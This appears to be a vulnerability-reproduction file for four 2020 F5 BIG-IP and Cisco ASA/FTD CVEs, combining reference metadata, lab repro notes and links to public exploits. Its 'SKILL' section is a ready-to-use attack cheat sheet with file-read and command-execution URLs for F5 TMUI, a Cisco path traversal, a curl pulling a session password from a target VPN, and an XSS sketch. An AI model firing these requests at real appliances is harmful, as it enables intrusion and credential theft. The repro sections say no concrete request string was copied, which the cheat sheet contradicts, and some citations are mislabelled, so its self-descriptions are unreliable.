---
# bughive-repro-start
cve:
  - CVE-2020-5902
  - CVE-2020-3452
  - CVE-2020-3187
  - CVE-2020-3580
repro: verified-public
references:
  - source: nvd
    id: CVE-2020-5902
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-5902"
    gave: "descriptions, configurations, 14 Exploit-tagged refs"
  - source: vendor
    id: CVE-2020-5902
    url: "https://support.f5.com/csp/article/K52145254"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2020-5902
    url: "https://github.com/advisories/GHSA-2859-2hr6-f86v"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2020-5902
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2020-5902
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48711.py"
    gave: "public PoC (EDB-48711)"
  - source: poc-in-github
    id: CVE-2020-5902
    url: "https://github.com/jas502n/CVE-2020-5902"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2020-3452
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-3452"
    gave: "descriptions, configurations, 6 Exploit-tagged refs"
  - source: vendor
    id: CVE-2020-3452
    url: "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2020-3452
    url: "https://github.com/advisories/GHSA-q26c-r46f-6fcq"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2020-3452
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2020-3452
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt"
    gave: "public PoC (EDB-48722)"
  - source: poc-in-github
    id: CVE-2020-3452
    url: "https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2020-3187
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-3187"
    gave: "descriptions, configurations, 2 Exploit-tagged refs"
  - source: vendor
    id: CVE-2020-3187
    url: "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2020-3187
    url: "https://github.com/advisories/GHSA-5f48-6vm9-w28v"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2020-3187
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "not in KEV"
  - source: exploitdb
    id: CVE-2020-3187
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48723.sh"
    gave: "public PoC (EDB-48723)"
  - source: poc-in-github
    id: CVE-2020-3187
    url: "https://github.com/Cappricio-Securities/CVE-2020-3187"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2020-3580
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-3580"
    gave: "description, configurations; no Exploit-tagged refs"
  - source: vendor
    id: CVE-2020-3580
    url: "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-xss-multiple-FCB3vPZe"
    gave: "not fetched; one request per host per run"
  - source: ghsa
    id: CVE-2020-3580
    url: "https://github.com/advisories/GHSA-rr9h-g433-576p"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2020-3580
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-11-03, dueDate 2022-05-03, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2020-3580
    url: null
    gave: "no row with this CVE in codes"
  - source: poc-in-github
    id: CVE-2020-3580
    url: "https://github.com/adarshvs/CVE-2020-3580"
    gave: "public PoC repository"
# bughive-repro-end
---

# SKILL: bigip-cisco-vpn
## F5 LFI (CVE-2020-5902)
https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
## F5 RCE
https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
## Cisco path traversal (CVE-2020-3452)
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
## Cisco session password (CVE-2020-3187)
curl -k -H "Cookie: token=../+CSCOU+/login-header-icon.jpg" https://vpn.target.com/+CSCOE+/session_password.html
## Cisco SAML XSS (CVE-2020-3580)
/+CSCOE+/saml/sp/acs?tgname=a with SAMLResponse containing svg/onload
## Triage
RCE → Critical. LFI → High. SAML XSS → Med/High.

<!-- bughive-repro-start -->
## Steps to reproduce — CVE-2020-5902

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: f5 big-ip_access_policy_manager >= 11.6.1, < 11.6.5.2; f5 big-ip_access_policy_manager >= 12.1.0, < 12.1.5.2; f5 big-ip_access_policy_manager >= 13.1.0, < 13.1.3.4. NVD lists 84 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-5902)]
- Weakness: CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-5902)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-5902)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48711.py)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: f5 big-ip_access_policy_manager >= 11.6.1, < 11.6.5.2. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-5902)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-5902)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48711.py)]

### Public PoC (if any)
- EDB-48711 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48711.py
- EDB-48642 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/webapps/48642.sh
- EDB-48643 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/webapps/48643.txt
- GHSA-listed: https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-5902
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/jas502n/CVE-2020-5902
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2020/CVE-2020-5902.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/158333/BIG-IP-TMUI-Remote-Code-Execution.html
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/158366/F5-BIG-IP-TMUI-Directory-Traversal-File-Upload-Code-Execution.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2020-3452

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: cisco adaptive_security_appliance_software >= 9.6, < 9.6.4.42; cisco adaptive_security_appliance_software >= 9.8, < 9.8.4.20; cisco adaptive_security_appliance_software >= 9.9, < 9.9.2.74. NVD lists 12 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)]
- Weakness: CWE-20, CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)]

### Input / trigger
- NVD characterizes the trigger as path traversal. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as path traversal. Structured affected range: cisco adaptive_security_appliance_software >= 9.6, < 9.6.4.42. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3452)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt)]

### Public PoC (if any)
- EDB-48722 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48722.txt
- EDB-49262 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/49262.py
- EDB-48871 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48871.txt
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3452
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2020/CVE-2020-3452.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/158647/Cisco-Adaptive-Security-Appliance-Software-9.11-Local-File-Inclusion.html
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/159523/Cisco-ASA-FTD-9.6.4.42-Path-Traversal.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2020-3187

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: cisco secure_firewall_threat_defense >= 6.2.3, < 6.2.3.16; cisco secure_firewall_threat_defense >= 6.3.0, < 6.3.0.6; cisco secure_firewall_threat_defense >= 6.4.0, < 6.4.0.8. NVD lists 22 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3187)]
- Weakness: CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3187)]

### Input / trigger
- NVD characterizes the trigger as directory traversal. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3187)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48723.sh)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as directory traversal. Structured affected range: cisco secure_firewall_threat_defense >= 6.2.3, < 6.2.3.16. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3187)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3187)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48723.sh)]

### Public PoC (if any)
- EDB-48723 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/hardware/webapps/48723.sh
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/Cappricio-Securities/CVE-2020-3187
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2020/CVE-2020-3187.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/158648/Cisco-Adaptive-Security-Appliance-Software-9.7-Arbitrary-File-Deletion.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2020-3580

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: cisco secure_firewall_threat_defense < 6.4.0.12; cisco secure_firewall_threat_defense >= 6.5.0, < 6.6.4; cisco secure_firewall_threat_defense >= 6.7.0, < 6.7.0.2. NVD lists 9 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3580)]
- Weakness: CWE-79. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3580)]

### Input / trigger
- NVD characterizes the trigger as cross-site scripting. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3580)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3580)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as cross-site scripting. Structured affected range: cisco secure_firewall_threat_defense < 6.4.0.12. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3580)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3580)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3580)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3580
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/adarshvs/CVE-2020-3580
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2020/CVE-2020-3580.json

### What's missing
- (none for verified-public)
<!-- bughive-repro-end -->
